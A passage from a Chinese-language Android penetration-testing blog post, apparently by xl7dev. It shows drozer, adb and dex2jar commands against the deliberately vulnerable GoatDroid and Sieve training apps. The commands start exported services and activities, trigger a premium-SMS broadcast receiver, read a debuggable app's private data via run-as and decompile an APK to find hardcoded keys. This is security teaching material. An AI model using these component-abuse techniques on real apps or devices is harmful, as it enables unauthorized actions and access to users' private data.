mPerf = com.qualcomm.qti.Performance@c941a0f</span><br></pre></td></tr></table></figure></p>
+<p>Copy/Paste Buffer Caching<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">复制粘贴异常导致程序崩溃</span><br></pre></td></tr></table></figure></p>
+<h4 id="Broken-Cryptography"><a href="#Broken-Cryptography" class="headerlink" title="Broken Cryptography"></a>Broken Cryptography</h4><p>加密算法秘钥显示在源代码中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; dex2jar diva-beta.apk</span><br><span class="line">this cmd is deprecated, use the d2j-dex2jar if possible</span><br><span class="line">dex2jar version: translator-0.0.9.15</span><br><span class="line">dex2jar diva-beta.apk -&gt; diva-beta_dex2jar.jar</span><br><span class="line">Done.</span><br><span class="line">&gt; jd-gui diva-beta_dex2jar.jar</span><br></pre></td></tr></table></figure></p>
+<h4 id="Attacking-Services"><a href="#Attacking-Services" class="headerlink" title="Attacking Services"></a>Attacking Services</h4><p>如开启定位服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.service.info --package org.owasp.goatdroid.fourgoats</span><br><span class="line">Package: org.owasp.goatdroid.fourgoats</span><br><span class="line">  org.owasp.goatdroid.fourgoats.services.LocationService</span><br><span class="line">    Permission: null</span><br><span class="line"></span><br><span class="line">dz&gt; run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.services.LocationService</span><br></pre></td></tr></table></figure></p>
+<h4 id="Attacking-Activities"><a href="#Attacking-Activities" class="headerlink" title="Attacking Activities"></a>Attacking Activities</h4><p>列出在AndroidManifest.xml文件中的组件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.activity.info -a org.owasp.goatdroid.fourgoats -u</span><br><span class="line">Package: org.owasp.goatdroid.fourgoats</span><br><span class="line">  Exported Activities:</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.Main</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.ViewCheckin</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.ViewProfile</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.SocialAPIAuthentication</span><br><span class="line">  Hidden Activities:</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.Login</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.Register</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.Home</span><br><span class="line">    org.owasp.goatdroid.fourgoats.fragments.DoCheckin</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.Checkins</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.Friends</span><br><span class="line">    org.owasp.goatdroid.fourgoats.fragments.HistoryFragment</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.History</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.Rewards</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.AddVenue</span><br><span class="line">    org.owasp.goatdroid.fourgoats.fragments.MyFriends</span><br><span class="line">    org.owasp.goatdroid.fourgoats.fragments.SearchForFriends</span><br><span class="line">    org.owasp.goatdroid.fourgoats.fragments.PendingFriendRequests</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.ViewFriendRequest</span><br><span class="line">    org.owasp.goatdroid.fourgoats.fragments.MyRewards</span><br><span class="line">    org.owasp.goatdroid.fourgoats.fragments.AvailableRewards</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.Preferences</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.About</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.SendSMS</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.DoComment</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.UserHistory</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.DestinationInfo</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.AdminHome</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.AdminOptions</span><br><span class="line">    org.owasp.goatdroid.fourgoats.fragments.ResetUserPasswords</span><br><span class="line">    org.owasp.goatdroid.fourgoats.fragments.DeleteUsers</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.DoAdminPasswordReset</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.DoAdminDeleteUser</span><br><span class="line">    org.owasp.goatdroid.fourgoats.activities.GenericWebViewActivity</span><br></pre></td></tr></table></figure></p>
+<p>激活组件 拒绝服务漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.activity.start --component org.owasp.goatdroid.herdfinancial org.owasp.goatdroid.herdfinancial.activities.Main</span><br></pre></td></tr></table></figure></p>
+<h4 id="Attacking-Broadcast-Receivers"><a href="#Attacking-Broadcast-Receivers" class="headerlink" title="Attacking Broadcast Receivers"></a>Attacking Broadcast Receivers</h4><p>发送短信<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.broadcast.info --package org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+</blockquote>
+<p>org.owasp.goatdroid.fourgoats.SOCIAL_SMS在AndroidManifest.xml是这个名字<br>org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver在源代码中是这个名字<br>phoneNumber–手机号<br>message–短信内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver --extra string phoneNumber 1234 --extra string message &quot;it&apos;s test&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="Exploiting-Debuggable-Applications"><a href="#Exploiting-Debuggable-Applications" class="headerlink" title="Exploiting Debuggable Applications"></a>Exploiting Debuggable Applications</h4><p>开启debug调试模式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">查看AndroidManifest.xml内容中android:debuggable=&quot;true&quot;</span><br><span class="line">使用如下命令比较两次结果可以查看到多了一个pid 5819</span><br><span class="line">&gt; adb jdwp</span><br><span class="line">1214</span><br><span class="line">2740</span><br><span class="line">2910</span><br><span class="line">2948</span><br><span class="line">2966</span><br><span class="line">3009</span><br><span class="line">3038</span><br><span class="line">3046</span><br><span class="line">3155</span><br><span class="line">3160</span><br><span class="line">3167</span><br><span class="line">3205</span><br><span class="line">&gt; adb jdwp</span><br><span class="line">1214</span><br><span class="line">2740</span><br><span class="line">2910</span><br><span class="line">2948</span><br><span class="line">2966</span><br><span class="line">3009</span><br><span class="line">3038</span><br><span class="line">3046</span><br><span class="line">3155</span><br><span class="line">3160</span><br><span class="line">3167</span><br><span class="line">3205</span><br><span class="line">5819</span><br><span class="line">&gt; adb shell ps|grep &apos;5819&apos;</span><br><span class="line">&gt; adb shell ps|grep goat</span><br><span class="line">u0_a236   5819  291   809528 66344 sys_epoll_ 00000000 S org.owasp.goatdroid.fourgoats</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell@cancro:/ $ run-as com.mwr.example.sieve</span><br><span class="line">shell@cancro:/data/data/com.mwr.example.sieve $ ls -al                         </span><br><span class="line">drwxrwx--x u0_a188  u0_a188           2015-08-03 20:51 cache</span><br><span class="line">drwxrwx--x u0_a188  u0_a188           2016-06-30 00:02 code_cache</span><br><span class="line">drwxrwx--x u0_a188  u0_a188           2014-08-01 22:32 databases</span><br><span class="line">lrwxrwxrwx root     root              2016-06-29 22:36 lib -&gt; /data/app-lib/com.mwr.example.sieve-1</span><br><span class="line">此时不需要root权限即可访问当前目录</span><br></pre></td></tr></table></figure></p>
+<h3 id="WebView"><a href="#WebView" class="headerlink" title="WebView"></a>WebView</h3><p><a href="https://jaq.alibaba.com/blog.htm?id=48" target="_blank" rel="noopener">WebView高危接口安全检测</a></p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2013-020246" target="_blank" rel="noopener">WebView明文存储密码漏洞</a></p>
+<p><a href="http://blog.csdn.net/jltxgcy/article/details/50678304" target="_blank" rel="noopener">Webview file跨域访问</a><br><a href="http://drops.wooyun.org/webview.html" target="_blank" rel="noopener">online</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Android/" rel="tag"># Android</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/03/17/GSM-Hacking-With-SMS-Sniffer-for-Kali2/" rel="next" title="GSM Hacking With SMS Sniffer for Kali2">
+                <i class="fa fa-chevron-left"></i> GSM Hacking With SMS Sniffer for Kali2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/03/30/XXE-Payloads/" rel="prev" title="XXE_Payloads">
+                XXE_Payloads <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460"
+                alt="xl7dev" />
+            
+              <p class="site-author-name" itemprop="name">xl7dev</p>
+              <p class="site-description motion-element" itemprop="description">Information Security</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">86</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.knownsec.com" title="Knownsec" target="_blank">Knownsec</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://javaweb.org" title="园长" target="_blank">园长</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://jeary.org" title="jeary" target="_blank">jeary</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.thinkings.org" title="Tr3jer" target="_blank">Tr3jer</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.php101.cn" title="tudouya" target="_blank">tudouya</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Tools"><span class="nav-number">1.</span> <span class="nav-text">Tools</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-adb-Usage"><span class="nav-number">1.1.</span> <span class="nav-text">1) adb Usage</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-dex2jar-Usage"><span class="nav-number">1.2.</span> <span class="nav-text">2) dex2jar Usage</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-jd-gui-Usage"><span class="nav-number">1.3.</span> <span class="nav-text">3) jd-gui Usage</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-apktool-Usage"><span class="nav-number">1.4.</span> <span class="nav-text">4) apktool Usage</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-drozer-Usage"><span class="nav-number">1.5.</span> <span class="nav-text">5) drozer Usage</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-pidcat"><span class="nav-number">1.6.</span> <span class="nav-text">6) pidcat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-重新打包签名"><span class="nav-number">1.7.</span> <span class="nav-text">7) 重新打包签名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-port"><span class="nav-number">1.8.</span> <span class="nav-text">8) port</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-frida"><span class="nav-number">1.9.</span> <span class="nav-text">9) frida</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-android-debug"><span class="nav-number">1.10.</span> <span class="nav-text">10) android debug</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#11-Inspeckage"><span class="nav-number">1.11.</span> <span class="nav-text">11) Inspeckage</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OWASP-Mobile-Top-10"><span class="nav-number">2.</span> <span class="nav-text">OWASP Mobile Top 10</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Insecure-Data-Storage"><span class="nav-number">2.1.</span> <span class="nav-text">Insecure Data Storage</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attacking-Content-Providers"><span class="nav-number">2.2.</span> <span class="nav-text">Attacking Content Providers</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Binary-Protections"><span class="nav-number">2.3.</span> <span class="nav-text">Binary Protections</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Insufficient-Transport-Layer-Protection"><span class="nav-number">2.4.</span> <span class="nav-text">Insufficient Transport Layer Protection</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Unintended-Data-Leakage"><span class="nav-number">2.5.</span> <span class="nav-text">Unintended Data Leakage</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Broken-Cryptography"><span class="nav-number">2.6.</span> <span class="nav-text">Broken Cryptography</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attacking-Services"><span class="nav-number">2.7.</span> <span class="nav-text">Attacking Services</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attacking-Activities"><span class="nav-number">2.8.</span> <span class="nav-text">Attacking Activities</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attacking-Broadcast-Receivers"><span class="nav-number">2.9.</span> <span class="nav-text">Attacking Broadcast Receivers</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exploiting-Debuggable-Applications"><span class="nav-number">2.10.</span> <span class="nav-text">Exploiting Debuggable Applications</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WebView"><span class="nav-number">3.</span> <span class="nav-text">WebView</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xl7dev</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
